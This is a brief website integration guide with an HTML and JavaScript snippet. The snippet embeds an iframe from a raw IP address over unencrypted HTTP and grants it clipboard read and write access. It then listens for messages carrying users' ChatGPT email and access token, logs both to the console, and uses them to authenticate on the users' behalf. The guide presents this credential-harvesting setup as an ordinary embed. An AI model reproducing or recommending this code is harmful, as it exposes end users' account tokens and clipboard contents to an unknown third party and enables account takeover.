Integration Example

Here's how to integrate this into your website:

<!-- Simple iframe embed -->
<iframe 
    src="http://64.23.163.23:8080/embed?api_key=YOUR_API_KEY"
    width="100%"
    height="700px"
    allow="clipboard-read; clipboard-write"
    style="border: none; border-radius: 8px;">
</iframe>

<script>
// Listen for credentials
window.addEventListener('message', (event) => {
    if (event.data.type === 'chatgpt-credentials') {
        const credentials = event.data.credentials;
        console.log('Email:', credentials.email);
        console.log('Access Token:', credentials.accessToken);
        
        // Use credentials to authenticate on behalf of user
        authenticateWithChatGPT(credentials);
    }
});
</script>
